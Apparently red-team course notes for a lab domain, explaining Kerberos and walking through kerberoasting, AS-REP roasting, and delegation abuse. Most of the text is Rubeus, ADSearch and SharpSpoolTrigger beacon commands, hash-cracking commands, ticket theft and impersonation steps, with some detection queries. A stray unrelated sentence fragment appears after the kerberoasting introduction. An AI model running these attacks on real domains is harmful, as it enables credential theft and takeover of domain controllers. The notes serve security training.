Kerberos is a fun topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies, but here's a brief overview:

![overview](https://github.com/user-attachments/assets/135dae6b-9f74-42e3-9769-14cf3ec95534)

When a user logs onto their workstation, their machine will send an AS-REQ message to the Key Distribution Center (KDC), aka Domain Controller, requesting a TGT using a secret key derived from the user’s password.

The KDC verifies the secret key with the password it has stored in Active Directory for that user. Once validated, it returns the TGT in an AS-REP message. The TGT contains the user's identity and is encrypted with the KDC secret key (the krbtgt account).

When the user attempts to access a resource backed by Kerberos authentication (e.g. a file share), their machine looks up the associated Service Principal Name (SPN). It then requests (TGS-REQ) a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're a valid user.

The KDC returns a TGS (TGS-REP) for the service in question to the user, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access or not.

# Kerberoasting

Services run on a machine under the context of a user account.  These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).  A Service Principal Name (SPN) is a unique identifier of a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service.  Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.  Rubeus kerberoast can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
lifeline on a slow check-in.  In which case, I can spawn a new HTTP session and work from there instead.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
    [*] Total kerberoastable users : 3

Even though Rubeus does not include the krbtgt account, it can sometimes be cracked.

These hashes can be cracked offline to recover the plaintext passwords for the accounts.  Use --format=krb5tgs --wordlist=wordlist hashes for john or -a 0 -m 13100 hashes wordlist for hashcat.

    $ john --format=krb5tgs --wordlist=wordlist mssql_svc
    Cyberb0tic       (mssql_svc$dev.cyberbotic.io)

I experienced some hash format incompatibility with john.  Removing the SPN so it became: $krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah] seemed to address the issue.


- By default, Rubeus will roast every account that has an SPN.  Honey Pot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted.

Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.

    event.code: 4769 and winlog.event_data.ServiceName: honey_svc

A much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

We can roast an individual account the /user parameter.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

# ASREP Roasting 

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.  This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

![preauth](https://github.com/user-attachments/assets/a2f8499a-21c7-495f-b041-5e1a86c5b1cb)

As with kerberoasting, we don't want to asreproast every account in the domain.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
    [*] TOTAL NUMBER OF SEARCH RESULTS: 1
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

Use --format=krb5asrep --wordlist=wordlist squid_svc for john or -a 0 -m 18200 squid_svc wordlist for hashcat.

    $ john --format=krb5asrep --wordlist=wordlist squid_svc
    Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)

ASREPRoasting with will generate a 4768 event with RC4 encryption and a preauth type of 0.

    event.code: 4768 and winlog.event_data.PreAuthType: 0 and winlog.event_data.TicketEncryptionType: 0x17

# Unconstrained Delegation 

Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.  The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

![unconstrained](https://github.com/user-attachments/assets/ca7c9d99-c8f5-4a2c-b03f-34761c981b40)

We know how a user performs Kerberos authentication to the Web Server, but how can the Web Server authenticate to the DB and perform actions as the user?  Unconstrained Delegation was the first solution to this problem, introduced in Windows 2000.  When configured on a computer, the KDC includes a copy of the user's TGT inside the TGS.  In this example, when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory.  When the Web Server needs to access the DB Server on behalf of that user, it uses the user’s TGT to request a TGS for the database service.

An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.  If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

This query will return all computers that are permitted for unconstrained delegation.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

- Domain Controllers are always permitted for unconstrained delegation.

If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as dir \\web\c$ is enough.  Rubeus triage will show all the tickets that are currently cached.  TGTs can be identified by the krbtgt service.

    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

There is a scheduled task running on Workstation 1 as nlamb that will interact with WEB$ every 5 minutes.  If the ticket is not there, wait a minute or so and try again.

We can simply extract this TGT and leverage it via a new logon session.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
    doIFwj [...snip...] MuSU8=
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
    
    [*] Using DEV\nlamb:FakePass
    
    [*] Showing process : False
    [*] Username        : nlamb
    [*] Domain          : DEV
    [*] Password        : FakePass
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 1540
    [+] Ticket successfully imported!
    [+] LUID            : 0x3206fb
    
    beacon> steal_token 1540
    
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

We can also obtain TGTs for computer accounts by forcing them to authenticate remotely to this machine.  As mentioned in the NTLM Relaying module of the Pivoting chapter, several tools exist to facilitate this.  This time, we will force the domain controller to authenticate to the web server to steal its TGT.

We will also utilise Rubeus' monitor command.  This will drop into loop and continuously monitor for and extract new TGT as they get cached.  It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

    [*] Action: TGT Monitoring
    [*] Monitoring every 10 seconds for new TGTs

Next, run SharpSpoolTrigger.

    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

Where:

- DC-2 is the "target".
- WEB is the "listener".

Rubeus will then capture the ticket.

    [*] 9/6/2022 2:44:52 PM UTC - Found new TGT:
    
    User                  :  DC-2$@DEV.CYBERBOTIC.IO
    StartTime             :  9/6/2022 9:06:14 AM
    EndTime               :  9/6/2022 7:06:14 PM
    RenewTill             :  9/13/2022 9:06:14 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    Base64EncodedTicket   :
    doIFuj[...]lDLklP

Machine TGTs are leveraged slightly differently - see the S4U2Self Abuse module.  To stop Rubeus, use the jobs and jobkill commands.

# Constrained Delegation

Constrained delegation was later introduced with Windows Server 2003 as a safer means for services to perform Kerberos delegation.  It aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.

![sql-2](https://github.com/user-attachments/assets/a4cb6608-d952-4c8d-ae69-6f36be523fb1)

In this case, SQL-2 can act on behalf of any user to the cifs service on DC-2.  CIFS is quite powerful as it allows you to list file shares and transfer files.  To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
    
    [*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [
    {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
    }
    ]

Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.

To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus dump:

      beacon> run hostname
      sql-2
      
      beacon> getuid
      [*] You are NT AUTHORITY\SYSTEM (admin)
      
      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap


You can also request one with Rubeus asktgt if you have NTLM or AES hashes.

With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2.  Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target.  In this case, a domain admin makes the most sense.

This will perform an S4U2Self first and then an S4U2Proxy. 

      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
      
      [*] Action: S4U
      [*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
      [*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
      [*] Sending S4U2self request to 10.10.122.10:88
      [+] S4U2self success!
      [*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
      [*] base64(ticket.kirbi):

      doIFnD[...]FMLTIk
      
      [*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
      [*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
      [*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
      [*] Sending S4U2proxy request to domain controller 10.10.122.10:88
      [+] S4U2proxy success!
      [*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGaD[...]ljLmlv
      
where:

- /impersonateuser is the user we want to impersonate.
- /msdsspn is the service principal name that SQL-2 is allowed to delegate to.
- /user is the principal allowed to perform the delegation.
- /ticket is the TGT for /user.

Grab the final S4U2Proxy ticket and pass it into a new logon session.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

    [*] Using DEV\nlamb:FakePass
    
    [*] Showing process : False
    [*] Username        : nlamb
    [*] Domain          : DEV
    [*] Password        : FakePass
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 5540
    [+] Ticket successfully imported!
    [+] LUID            : 0x3d3194
    
    beacon> steal_token 5540
    
    beacon> ls \\dc-2.dev.cyberbotic.io\c$


Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.

    beacon> ls \\dc-2\c$
    [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE

















